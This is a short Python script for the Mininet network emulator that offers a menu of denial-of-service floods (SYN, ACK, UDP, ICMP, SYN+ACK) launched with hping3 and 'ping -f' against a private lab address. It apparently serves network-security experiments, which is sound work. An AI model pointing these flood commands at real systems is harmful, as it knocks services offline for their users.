#!/usr/bin/env python3
"""
Menu de ataques para Mininet
Ejecutar en Mininet CLI: py exec(open('scripts/attack_menu.py').read())
"""

TARGET_IP = "10.1.1.2"

print("\n=== DDoS Attack Generator ===")
print("Target: %s\n" % TARGET_IP)
print("  [1] SYN Flood")
print("  [2] ACK Flood")
print("  [3] UDP Flood")
print("  [4] ICMP Flood")
print("  [5] SYN+ACK Flood")
print("  [0] Salir\n")

opt = input("Opcion: ")

h1 = net.getNodeByName('h1')

if opt == "1":
    print("\n=== SYN Flood ===")
    print("Ctrl+C para detener\n")
    h1.cmd("hping3 --flood -S -p 80 " + TARGET_IP)

elif opt == "2":
    print("\n=== ACK Flood ===")
    print("Ctrl+C para detener\n")
    h1.cmd("hping3 --flood -A -p 80 " + TARGET_IP)

elif opt == "3":
    print("\n=== UDP Flood ===")
    print("Ctrl+C para detener\n")
    h1.cmd("hping3 --flood --udp -p 80 " + TARGET_IP)

elif opt == "4":
    print("\n=== ICMP Flood ===")
    print("Ctrl+C para detener\n")
    h1.cmd("ping -f " + TARGET_IP)

elif opt == "5":
    print("\n=== SYN+ACK Flood ===")
    print("Ctrl+C para detener\n")
    h1.cmd("hping3 --flood -S -A -p 80 " + TARGET_IP)

else:
    print("\nSaliendo...\n")
